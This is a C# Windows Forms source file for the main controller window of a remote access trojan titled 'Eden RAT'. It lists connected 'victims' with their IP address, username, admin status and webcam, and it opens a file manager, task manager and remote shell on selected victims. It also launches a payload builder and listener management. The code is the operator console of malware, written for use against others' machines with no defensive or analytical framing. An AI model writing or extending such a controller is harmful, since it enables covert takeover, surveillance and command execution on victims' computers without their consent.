using System.Reflection.Metadata.Ecma335;
using System.Text.Json;

namespace Eden
{
    public partial class Form1 : Form
    {
        public Client m_clnt;
        private List<List<string>> m_lsListener;

        public Form1()
        {
            InitializeComponent();
        }

        #region Tools

        private bool fnClientIsNull() => m_clnt == null;

        #endregion

        void ServerMessageReceived(Client clnt, string szVictimID, string[] aMsg)
        {
            try
            {
                if (aMsg[0] == "info")
                {
                    if (aMsg[1] == "start")
                    {
                        Dictionary<string, JsonElement> dic = clsTools.EZData.JsonStr2Dic(aMsg[2]);
                        string szID = dic["ID"].GetString();

                        Invoke(new Action(() =>
                        {
                            //Victim Folder
                            string szDirectory = Path.Combine(new string[]
                            {
                            Application.StartupPath,
                            "Victim",
                            szVictimID,
                            });
                            if (!Directory.Exists(szDirectory))
                                Directory.CreateDirectory(szDirectory);

                            //Display in listview
                            string szIP = dic["IP"].GetString();
                            string szHostname = dic["Hostname"].GetString();
                            string szUsername = dic["Username"].GetString();
                            string szOS = dic["OS"].GetString();
                            int iUid = int.Parse(dic["uid"].GetString());
                            bool bAdmin = dic["admin"].GetBoolean();
                            bool bMonitor = dic["Monitor"].GetBoolean();
                            bool bWebcam = dic["Webcam"].GetBoolean();
                            decimal dPing = dic["Ping"].GetDecimal() + clnt.m_nLattency;
                            string szCPU = dic["CPU"].GetString();

                            ListViewItem item = new ListViewItem(szID);
                            item.SubItems.Add(szIP);
                            item.SubItems.Add(szHostname);
                            item.SubItems.Add(szUsername);
                            item.SubItems.Add(szOS);
                            item.SubItems.Add(iUid.ToString());
                            item.SubItems.Add(bAdmin ? "True" : "False");
                            item.SubItems.Add(bMonitor ? "True" : "False");
                            item.SubItems.Add(bWebcam ? "True" : "False");
                            item.SubItems.Add($"{dPing} ms");
                            item.SubItems.Add(szCPU);

                            ListViewItem x = listView1.FindItemWithText(szID);

                            if (x == null)
                            {
                                var stVictimInfo = new Victim.stVictimInfo()
                                {
                                    clnt = clnt,

                                    ID = szID,
                                    IPAddr = szIP,
                                    Username = szUsername,
                                    OS = szOS,
                                    uid = iUid,
                                    isRoot = bAdmin,
                                    ExistsMonitor = bMonitor,
                                    ExistsWebcam = bWebcam,

                                    VictimDirectory = szDirectory,
                                };

                                Victim v = new Victim(stVictimInfo);
                                item.Tag = v;

                                listView1.Items.Add(item);
                            }
                            else
                            {
                                for (int i = 1; i < item.SubItems.Count; i++)
                                    x.SubItems[i].Text = item.SubItems[i].Text;
                            }
                        }));
                    }
                }
                else if (aMsg[0] == "listener")
                {
                    if (aMsg[1] == "list")
                    {
                        if (aMsg[2] == "listener")
                        {
                            List<List<string>> lsListener = clsTools.EZData.String2TwoDList(aMsg[3]);
                            m_lsListener = lsListener;
                        }
                    }
                }
                else if (aMsg[0] == "disconnect")
                {
                    if (aMsg[1] == "victim")
                    {
                        Invoke(new Action(() =>
                        {
                            ListViewItem item = listView1.FindItemWithText(aMsg[2]);
                            if (item != null)
                                listView1.Items.Remove(item);
                        }));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        void Disconnect(Client clnt, string szMsg)
        {
            Invoke(new Action(() =>
            {
                MessageBox.Show("You are disconnected to the server.", "Disconnect", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                listView1.Items.Clear();

                toolStripMenuItem7.Enabled = m_clnt != null;
                toolStripButton1.Enabled = m_clnt != null;
            }));
        }

        void fnSetup()
        {
            toolStripMenuItem7.Enabled = m_clnt != null;
            toolStripButton1.Enabled = m_clnt != null;

            timer1.Start();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            frmConnect f = new frmConnect();
            f.ShowDialog();

            Client clnt = f.m_clnt;
            f.Dispose();

            toolStripMenuItem7.Enabled = clnt != null;
            toolStripButton1.Enabled = clnt != null;

            if (clnt == null)
                return;

            m_clnt = clnt;

            clnt.ServerMessageReceived += ServerMessageReceived;
            clnt.SocketDisconnect += Disconnect;

            clnt.SendCommand("user|list");
            clnt.SendCommand("listener|list|listener");
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            frmListener f = new frmListener();
            f.m_clnt = m_clnt;

            f.Show();
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmInformation frm;
                if (clsTools.FindForm<frmInformation>(item.Text) != null)
                    continue;

                frmInformation f = new frmInformation();
                f.m_clnt = m_clnt;
                f.szVictimID = item.Text;

                f.Show();
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmFileMgr frm;
                if (clsTools.FindForm<frmFileMgr>(item.Text) != null)
                    continue;

                frmFileMgr f = new frmFileMgr(clsTools.fnGetVictimTag(item));
                f.m_clnt = m_clnt;
                f.szVictimID = item.Text;

                f.Show();
            }
        }

        private void toolStripButton1_Click_1(object sender, EventArgs e)
        {
            frmBuild f = new frmBuild(m_clnt, m_lsListener);
            f.Show();
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (fnClientIsNull())
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (clsTools.FindForm<frmTaskMgr>(item.Text) != null)
                    continue;

                frmTaskMgr f = new frmTaskMgr(clsTools.fnGetVictimTag(item));
                f.Show();
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (fnClientIsNull())
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (clsTools.FindForm<frmShell>(item.Text) != null)
                    continue;

                frmShell f = new frmShell(clsTools.fnGetVictimTag(item));
                f.Show();
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Text = $"Eden RAT by ISSAC | Online[{listView1.Items.Count}] | " +
                $"Selected[{listView1.SelectedItems.Count}] | " +
                $"Is Connected: {(fnClientIsNull() ? "False" : "True")}";
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            timer1.Stop();
        }
    }
}
